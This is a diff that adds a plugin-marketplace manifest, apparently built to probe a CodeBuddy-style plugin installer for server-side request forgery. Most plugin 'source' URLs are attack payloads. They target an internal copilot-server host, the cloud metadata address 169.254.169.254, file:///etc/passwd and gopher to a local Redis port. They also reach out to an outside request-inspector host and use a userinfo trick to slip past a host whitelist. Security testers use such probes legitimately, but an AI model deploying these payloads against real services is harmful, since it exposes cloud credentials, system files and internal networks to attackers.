@@ -1,0 +1,69 @@
+{
+  "name": "cbmp-probe",
+  "description": "probe marketplace",
+  "owner": {
+    "name": "probe"
+  },
+  "plugins": [
+    {
+      "name": "arm-d-rel",
+      "description": "relative control",
+      "version": "1.0.0",
+      "source": "./plugins/ok"
+    },
+    {
+      "name": "arm-a-abs-gh-raw",
+      "description": "absolute raw url",
+      "version": "1.0.0",
+      "source": "https://raw.githubusercontent.com/Prorise-cool/cb-mp-probe/master/plugins/ok/.codebuddy-plugin/plugin.json"
+    },
+    {
+      "name": "arm-b-internal",
+      "description": "internal copilot-server",
+      "version": "1.0.0",
+      "source": "https://copilot-server:8000/plugin.json"
+    },
+    {
+      "name": "arm-c-meta",
+      "description": "metadata ip",
+      "version": "1.0.0",
+      "source": "http://169.254.169.254/latest/meta-data/"
+    },
+    {
+      "name": "arm-e-git",
+      "description": "git+https",
+      "version": "1.0.0",
+      "source": "git+https://github.com/Prorise-cool/cb-mp-probe"
+    },
+    {
+      "name": "arm-f-file",
+      "description": "file scheme",
+      "version": "1.0.0",
+      "source": "file:///etc/passwd"
+    },
+    {
+      "name": "arm-g-gopher",
+      "description": "gopher scheme",
+      "version": "1.0.0",
+      "source": "gopher://127.0.0.1:6379/_INFO"
+    },
+    {
+      "name": "arm-h-http-oob",
+      "description": "http nonwhitelist",
+      "version": "1.0.0",
+      "source": "http://requestinspector.com/x/plugin.json"
+    },
+    {
+      "name": "arm-i-userinfo",
+      "description": "userinfo trick",
+      "version": "1.0.0",
+      "source": "https://cnb.cool@requestinspector.com/plugin.json"
+    },
+    {
+      "name": "arm-j-gh404",
+      "description": "absolute 404 on whitelisted host",
+      "version": "1.0.0",
+      "source": "https://raw.githubusercontent.com/Prorise-cool/cb-mp-probe/master/plugins/nothere/.codebuddy-plugin/plugin.json"
+    }
+  ]
+}
